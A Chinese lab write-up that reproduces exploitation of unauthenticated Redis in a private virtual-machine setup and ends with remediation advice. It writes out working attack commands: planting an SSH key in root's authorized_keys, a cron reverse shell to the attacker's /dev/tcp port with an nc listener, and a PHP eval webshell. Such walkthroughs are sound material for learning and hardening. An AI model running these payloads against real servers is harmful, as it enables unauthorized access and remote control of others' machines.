---
title: 记一次Redis未授权访问复现
date: 2020-08-22 11:49:22
tags:
---
## 0x00 环境搭建：<br>
[Ubuntu18.04](https://blog.csdn.net/qq_42372031/article/details/100588245) 192.168.10.131
用ISO镜像文件创建虚拟机后，如果想删除ISO镜像文件则需要更改以下2点：<br>
1、在设置->硬件->CD/DVD的连接中更改为使用物理驱动器（自动检测）
![自动检测](/assets/Redis未授权/自动检测.png)
2、在设置->硬件->显示器的3D图形中取消勾选加速3D图形（若不更改，容易出现开机黑屏故障）
![不启用加速3D图形](/assets/Redis未授权/不启用加速3D图形.png)
## 0x01 漏洞描述
Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有添加防火墙规则避免其他非信任来源ip访问等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作。

## 0X02 漏洞的产生条件:

1. Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
2. 没有设置密码认证（默认为空），可以免密码登录redis服务

## 0X03 漏洞危害

1. 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据
2. 攻击者可通过eval执行代码，或通过数据备份功能往磁盘写入后门文件
3. 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器

## 0X04 漏洞环境搭建
靶机:ubuntu 18.04  192.168.10.132<br>
攻击机:kali        192.168.10.128<br>

### 1. 靶机安装redis服务器(redis-server)

#### 1.1 下载redis-4.0.10(其他可利用的版本也可),并编译运行

```
sudo wget http://download.redis.io/releases/redis-4.0.10.tar.gz
sudo tar -zxvf redis-4.0.10.tar.gz
cd redis-4.0.10/
```
在redis-4.0.10文件夹下运行`make`,发现找不到`make`命令报错，
则安装`make`：
```
sudo apt install make
```
继续`make`发现gcc报错如下：
![gcc报错](/assets/Redis未授权/gcc报错.png)
发现是未安装gcc,安装gcc或者重新建立软连接即可：
```
sudo apt install gcc
sudo ln -s gcc cc
```
继续`make`仍然有报错如下：
![make报错](/assets/Redis未授权/make报错.png)
使用`make MALLOC=libc`替代`make`解决。<br>
继续`cd src/`切换到Redis的src文件夹下执行:
```
sudo make MALLOC=libc install  
//如果没有此步，redis-server redis.conf 这个命令是不会执行的。
```
至此编译成功：
![编译成功](/assets/Redis未授权/编译成功.png)
`redis-server redis.conf`启动服务：
![启动服务](/assets/Redis未授权/redis-server.png)
kali安装Redis客户端。
使用攻击机Redis客户端连接，发现redis的`protected-mode`开启：
![protected](/assets/Redis未授权/protected.png)
修改Redis服务端redis.conf配置文件:<br>
1、关闭`protected-mode`
![关闭protected](/assets/Redis未授权/关闭protected.png)
2、绑定本机可以接受访问的IP（图中两种方式都可以）
![bindip](/assets/Redis未授权/bindip.png)

##  0x05 Redis未授权漏洞利用
### 1、写入ssh公钥实现ssh远程登录
>其原理是在redis数据库中插入一条数据，将攻击机的公钥作为value,key值随意，然后通过修改redis数据库的默认路径为/root/.ssh（该路径当服务端redis服务为root权限运行时才可用，若为其他用户运行时，则需要更改为对应的路径；且该路径只有在服务端启用了ssh,并使用密钥ssh远程登录过后才会生成）和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。关于ssh密钥远程登录的细节后续再另外说明。

#### step 1. 在攻击机中生产ssh密钥对
```
ssh-keygen -t rsa
```
![ssh-keygen](/assets/Redis未授权/ssh-keygen.png)

#### step 2. 将公钥写入pub.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）。
```
(echo -e "\n";cat id_rsa.pub;echo -e "\n")>pub.txt
```
![pubkey](/assets/Redis未授权/pubkey.png)
#### step 3. 再把pub.txt文件内容写入redis缓冲

```
cat /home/kali/.ssh/pub.txt | redis-cli -h 192.168.10.132 -x set pub
```
![redis写入pub](/assets/Redis未授权/redis写入pub.png)
#### step 4. 设置redis的dump文件路径为/root/.ssh且文件名为authorized_keys
>注意: redis可以创建文件但无法创建目录，所以redis待写入文件所在的目录必须事先存在。出现如下图错误是因为目标靶机不存在.ssh目录(默认没有,需要生成公、私钥或者建立ssh连接时才会生成)。当目标使用过ssh服务之后,就会产生.ssh目录了，然后进行如下操作<br>

![set_db_filename](/assets/Redis未授权/set_db_filename.png)
#### step 5. 验证,登录成功。
`ssh root@192.168.13.132`
![ssh登录](/assets/Redis未授权/ssh登录.png)

### 2、在crontab里写入反弹shell的计划任务（在足够的权限下）

> 在利用redis在ubuntu下通过cron反弹shell时一直不成功,3点原因如下：
>1. ubuntu的cron的shell环境和centos不一样，
>2. cron文件权限问题,非600报错
>3. 通过redis写的任务计划里的乱码也会导致cron文件不能执行<br>
>参考：`http://zone.secevery.com/article/972`<br>

#### 在centos上可以反弹shell
#### step 1. 通过redis-cli进入交互式shell
```redis-cli -h 192.168.10.132```
![redis-cli](/assets/Redis未授权/redis-cli.png)
#### step 2. 查看`dir`和`dbfilename`参数信息，用于还原原有配置
```
config get dir
config get dbfilename
```
![原配置](/assets/Redis未授权/原配置.png)
#### step 3. 设置redis保存数据的文件夹路径
```
config set dir /var/spool/cron/crontabs
```
此时若redis为非root权限运行则set dir到crontabs文件夹（Ubuntu计划任务文件夹）下失败，改为root运行即可：
![set_dir](/assets/Redis未授权/set_dir.png)
但是非root运行时可以set dir到cron文件夹下（centos计划任务文件夹）
![set_dir2](/assets/Redis未授权/set_dir2.png)
#### step 4. 设置redis保存数据的文件名
```
config set dbfilename root
```
![set_filename](/assets/Redis未授权/set_filename.png)
#### step 5. 设置写入计划任务的内容（key值随意）,并保存
```
set xxx  "\n\n\n* * * * * bash -i>& /dev/tcp/192.168.10.128/6666 0>&1\n\n\n"
save
```
![set_cron](/assets/Redis未授权/set_cron.png)
#### step 6. 在攻击机上nc监听端口，接收反弹shell
```
nc -lvvp 6666
```
![反弹shell](/assets/Redis未授权/反弹shell.png)
#### tips：
1. 出错时使用`tail -f /var/log/syslog`查看系统日志
2. 在Ubuntu环境中，crontabs/root的权限不是600（-rw-------）时报错如下`(root) INSECURE MODE (mode 0600 expected) (crontabs/root)`
3. 在Ubuntu下报错(CRON) info (No MTA installed, discarding output)时，将cron文件改为`* * * * * bash -c 'bash -i>& /dev/tcp/192.168.10.128/6666 0>&1`即可

### 3、写入webshell
>利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限<br>
#### step 1.设置存储文件夹的路径、文件名以及一句话木马
```
config set dir /var/www/html
config set dbfilename shell.php
set xxx "\n\n\n<?php @eval($POST['key']);?>\n\n\n"
save
```
![写入webshell](/assets/Redis未授权/写入webshell.png)
#### step 2.使用蚁剑连接
第一次连不上，我在一句话木马的基础上又写了phpinfo,就好了。
```
set x "\n\n\n<?php phpinfo();?>\n\n\n"
```
![phpinf](/assets/Redis未授权/phpinfo.png)
![getshell](/assets/Redis未授权/getshell.png)
## 总结
总的来说，Redis未授权访问就是攻击者可以进入redis数据库，并将恶意数据写入到有权限写的路径下，获取主机的权限等。
## 修复建议
1. 禁止使用root权限启动redis服务
2. 配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379
3. 配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中